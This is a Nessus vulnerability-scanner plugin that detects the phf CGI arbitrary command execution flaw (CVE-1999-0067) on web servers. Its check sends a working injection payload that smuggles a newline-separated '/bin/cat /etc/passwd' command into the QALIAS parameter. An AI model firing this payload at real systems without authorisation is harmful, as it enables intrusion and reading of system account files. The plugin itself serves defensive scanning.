#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10176);
 script_version("$Revision: 1.34 $");
 script_cvs_date("$Date: 2012/12/10 14:56:54 $");

 script_cve_id("CVE-1999-0067");
 script_bugtraq_id(629);
 script_osvdb_id(136);
 script_xref(name:"CERT-CC", value:"CA-1996-06");

 script_name(english:"Multiple Vendor phf CGI Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/phf");
 
 script_set_attribute(attribute:"synopsis", value:"It is possible to execute arbitrary commands on the remote host.");
 script_set_attribute(attribute:"description", value:
"The 'phf' CGI is installed.  This CGI has a well known security flaw
that lets an attacker execute arbitrary commands with the privileges of
the http daemon (usually root or nobody).");
 script_set_attribute(attribute:"solution", value:"Remove the CGI from /cgi-bin.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");

 script_set_attribute(attribute:"vuln_publication_date", value:"1996/03/20");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 1999-2012 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  exploit = string(dir, "/phf?QALIAS=x%0a/bin/cat%20/etc/passwd");

  res = http_send_recv3(port:port, method:"GET", item:exploit);
  if(isnull(res)) exit(1,"Null response for '" + exploit + "' request.");

  if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2]))
 	security_hole(port);
}
